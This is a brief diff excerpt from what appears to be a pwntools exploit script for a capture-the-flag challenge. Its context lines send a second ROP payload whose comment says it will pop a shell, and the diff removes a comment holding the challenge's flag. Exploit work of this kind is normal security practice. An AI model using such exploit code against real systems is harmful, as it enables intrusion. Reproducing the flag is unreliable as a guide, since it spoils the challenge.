@@ -121,7 +121,6 @@ io.sendlineafter(b'from?',payload)# send our secondo rop to pop the shell and he
 
 io.interactive()
 
-#flag = flag{d0Nt_F0rg37_y0uR_5tr1nG_T3rM1n470R}
 
  
 
